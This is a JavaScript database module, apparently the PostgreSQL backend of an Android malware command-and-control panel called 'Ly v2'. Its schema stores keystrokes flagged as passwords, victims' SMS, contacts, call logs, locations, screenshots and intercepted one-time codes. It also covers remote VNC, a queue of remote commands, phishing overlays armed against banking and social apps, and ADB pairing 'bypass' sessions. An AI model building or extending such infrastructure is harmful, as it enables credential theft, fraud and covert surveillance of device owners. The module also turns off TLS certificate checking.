'use strict';
/**
 * db.js — PostgreSQL backend for Ly v2
 * Drop-in replacement for the SQLite version.
 * Exports the same { run, get, all } API so hub.js and routes need no changes.
 *
 * Required env:
 *   DATABASE_URL   e.g. postgres://user:pass@host:5432/dbname
 *                  (Render / Railway / Supabase all set this automatically)
 *
 * npm install pg
 */

const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL?.includes('localhost')
    ? false
    : { rejectUnauthorized: false },
  max:              20,
  idleTimeoutMillis: 30_000,
  connectionTimeoutMillis: 5_000,
});

pool.on('error', err => console.error('[db] pool error:', err.message));

// ── Schema bootstrap ──────────────────────────────────────────────────────────
async function bootstrap() {
  const client = await pool.connect();
  try {
    await client.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id            TEXT    PRIMARY KEY,
        alias         TEXT,
        first_seen    BIGINT  NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        last_seen     BIGINT  NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        online        INTEGER NOT NULL DEFAULT 0,
        info          TEXT    NOT NULL DEFAULT '{}',
        tags          TEXT    NOT NULL DEFAULT '[]',
        screen_w      INTEGER NOT NULL DEFAULT 1080,
        screen_h      INTEGER NOT NULL DEFAULT 1920,
        vnc_quality   INTEGER NOT NULL DEFAULT 50,
        vnc_active    INTEGER NOT NULL DEFAULT 0,
        fin_count     INTEGER NOT NULL DEFAULT 0,
        social_count  INTEGER NOT NULL DEFAULT 0
      );
      CREATE INDEX IF NOT EXISTS idx_dev_online ON devices(online);
      CREATE INDEX IF NOT EXISTS idx_dev_seen   ON devices(last_seen DESC);

      CREATE TABLE IF NOT EXISTS events (
        id     BIGSERIAL PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        dev_id TEXT   NOT NULL,
        type   TEXT   NOT NULL,
        data   TEXT
      );
      CREATE INDEX IF NOT EXISTS idx_evt_dev  ON events(dev_id);
      CREATE INDEX IF NOT EXISTS idx_evt_ts   ON events(ts DESC);
      CREATE INDEX IF NOT EXISTS idx_evt_type ON events(type);

      CREATE TABLE IF NOT EXISTS keylogs (
        id          BIGSERIAL PRIMARY KEY,
        ts          BIGINT  NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        dev_id      TEXT    NOT NULL,
        app         TEXT,
        pkg         TEXT,
        text        TEXT,
        is_password INTEGER NOT NULL DEFAULT 0
      );
      CREATE INDEX IF NOT EXISTS idx_kl_dev  ON keylogs(dev_id);
      CREATE INDEX IF NOT EXISTS idx_kl_ts   ON keylogs(ts DESC);
      CREATE INDEX IF NOT EXISTS idx_kl_pkg  ON keylogs(pkg);
      CREATE INDEX IF NOT EXISTS idx_kl_pass ON keylogs(is_password);

      CREATE TABLE IF NOT EXISTS device_sms (
        dev_id TEXT   PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]'
      );
      CREATE TABLE IF NOT EXISTS device_contacts (
        dev_id TEXT   PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]'
      );
      CREATE TABLE IF NOT EXISTS device_apps (
        dev_id TEXT   PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]'
      );
      CREATE TABLE IF NOT EXISTS device_accounts (
        dev_id TEXT   PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]'
      );
      CREATE TABLE IF NOT EXISTS device_calls (
        dev_id TEXT   PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]'
      );

      CREATE TABLE IF NOT EXISTS device_location (
        id       BIGSERIAL PRIMARY KEY,
        dev_id   TEXT   NOT NULL,
        ts       BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        lat      REAL   NOT NULL,
        lng      REAL   NOT NULL,
        accuracy REAL,
        address  TEXT
      );
      CREATE INDEX IF NOT EXISTS idx_loc_dev ON device_location(dev_id);
      CREATE INDEX IF NOT EXISTS idx_loc_ts  ON device_location(ts DESC);

      CREATE TABLE IF NOT EXISTS files (
        id     BIGSERIAL PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        dev_id TEXT   NOT NULL,
        name   TEXT,
        size   BIGINT,
        path   TEXT
      );
      CREATE INDEX IF NOT EXISTS idx_files_dev ON files(dev_id);
      CREATE INDEX IF NOT EXISTS idx_files_ts  ON files(ts DESC);

      -- file_listings: single blob per (device, path) for file browser tab
      CREATE TABLE IF NOT EXISTS file_listings (
        dev_id TEXT   NOT NULL,
        path   TEXT   NOT NULL DEFAULT '/',
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL DEFAULT '[]',
        PRIMARY KEY (dev_id, path)
      );
      CREATE INDEX IF NOT EXISTS idx_fl_dev ON file_listings(dev_id);

      CREATE TABLE IF NOT EXISTS cmd_queue (
        id     BIGSERIAL PRIMARY KEY,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        dev_id TEXT   NOT NULL,
        cmd    TEXT   NOT NULL,
        args   TEXT   NOT NULL DEFAULT '{}'
      );
      CREATE INDEX IF NOT EXISTS idx_queue_dev ON cmd_queue(dev_id);

      CREATE TABLE IF NOT EXISTS app_detections (
        dev_id   TEXT NOT NULL,
        package  TEXT NOT NULL,
        name     TEXT,
        category TEXT,
        type     TEXT,
        country  TEXT,
        detected TEXT    DEFAULT 'db',
        ts       BIGINT  NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        PRIMARY KEY (dev_id, package)
      );
      CREATE INDEX IF NOT EXISTS idx_det_dev ON app_detections(dev_id);
      CREATE INDEX IF NOT EXISTS idx_det_cat ON app_detections(category);

      CREATE TABLE IF NOT EXISTS overlays (
        id           TEXT   PRIMARY KEY,
        name         TEXT   NOT NULL,
        package_name TEXT   NOT NULL,
        app_name     TEXT,
        category     TEXT,
        html         TEXT   NOT NULL,
        auto_deploy  INTEGER NOT NULL DEFAULT 0,
        created_at   BIGINT  NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
      );
      CREATE INDEX IF NOT EXISTS idx_ov_pkg ON overlays(package_name);

      CREATE TABLE IF NOT EXISTS overlay_deployments (
        id         BIGSERIAL PRIMARY KEY,
        dev_id     TEXT NOT NULL,
        overlay_id TEXT NOT NULL,
        package    TEXT NOT NULL,
        armed_at   BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        status     TEXT   NOT NULL DEFAULT 'armed',
        UNIQUE(dev_id, overlay_id)
      );
      CREATE INDEX IF NOT EXISTS idx_dep_dev ON overlay_deployments(dev_id);

      CREATE TABLE IF NOT EXISTS screenshots (
        id     BIGSERIAL PRIMARY KEY,
        dev_id TEXT   NOT NULL,
        ts     BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        data   TEXT   NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_ss_dev ON screenshots(dev_id);
      CREATE INDEX IF NOT EXISTS idx_ss_ts  ON screenshots(ts DESC);

      CREATE TABLE IF NOT EXISTS notifications (
        id       BIGSERIAL PRIMARY KEY,
        dev_id   TEXT   NOT NULL,
        ts       BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
        app      TEXT,
        package  TEXT,
        title    TEXT,
        text     TEXT,
        is_otp   INTEGER NOT NULL DEFAULT 0,
        otp_code TEXT
      );
      CREATE INDEX IF NOT EXISTS idx_notif_dev ON notifications(dev_id);
      CREATE INDEX IF NOT EXISTS idx_notif_ts  ON notifications(ts DESC);
      CREATE INDEX IF NOT EXISTS idx_notif_otp ON notifications(is_otp);

      CREATE TABLE IF NOT EXISTS bypass_sessions (
        id         BIGSERIAL PRIMARY KEY,
        dev_id     TEXT   NOT NULL UNIQUE,
        ip         TEXT,
        adb_port   INTEGER,
        pair_port  INTEGER,
        pair_code  TEXT,
        status     TEXT   NOT NULL DEFAULT 'idle',
        data       TEXT,
        updated_at BIGINT NOT NULL DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
      );
      CREATE INDEX IF NOT EXISTS idx_bypass_dev ON bypass_sessions(dev_id);
    `);
    console.log('[db] PostgreSQL schema ready');
  } catch (err) {
    console.error('[db] bootstrap error:', err.message);
    throw err;
  } finally {
    client.release();
  }
}

bootstrap().catch(err => {
  console.error('[db] FATAL — could not initialise database:', err.message);
  process.exit(1);
});

// ── SQLite-compatible param conversion: ? → $1, $2 … ────────────────────────
// SQLite uses `?` positional params; pg uses `$1`.
// This lets hub.js / routes use unchanged SQLite-style query strings.
function convertSQL(sql) {
  let i = 0;
  return sql.replace(/\?/g, () => `$${++i}`);
}

// ── SQLite NOW() equivalents ─────────────────────────────────────────────────
// SQLite: strftime('%s','now')  →  pg: EXTRACT(EPOCH FROM NOW())::BIGINT
// We do a lightweight string replace on the rare places these appear.
function normalizeSql(sql) {
  return sql
    .replace(/strftime\('%s',\s*'now'\)/gi, `EXTRACT(EPOCH FROM NOW())::BIGINT`)
    .replace(/AUTOINCREMENT/gi, '')   // pg uses SERIAL/BIGSERIAL; already handled in schema
    .replace(/INTEGER PRIMARY KEY(?!\s+AUTOINCREMENT)/gi, 'BIGSERIAL PRIMARY KEY');
}

// ── Promisified helpers (same signature as SQLite version) ───────────────────

/**
 * run — execute a DML statement (INSERT / UPDATE / DELETE).
 * Returns a result object with { rowCount, lastID }
 * matching sqlite3's `this.lastID` / `this.changes` shape.
 */
const run = async (sql, params = []) => {
  const pgSql = convertSQL(normalizeSql(sql));
  // For INSERT … RETURNING id — capture the generated id
  const isInsert = /^\s*INSERT/i.test(pgSql);
  const query = isInsert && !pgSql.includes('RETURNING')
    ? pgSql + ' RETURNING id'
    : pgSql;
  const result = await pool.query(query, params);
  return {
    rowCount: result.rowCount,
    lastID:   result.rows?.[0]?.id ?? null,
    changes:  result.rowCount,
  };
};

/**
 * get — return the first matching row (or undefined).
 */
const get = async (sql, params = []) => {
  const pgSql = convertSQL(normalizeSql(sql));
  const result = await pool.query(pgSql, params);
  return result.rows[0];
};

/**
 * all — return all matching rows as an array.
 */
const all = async (sql, params = []) => {
  const pgSql = convertSQL(normalizeSql(sql));
  const result = await pool.query(pgSql, params);
  return result.rows;
};

module.exports = { pool, run, get, all };
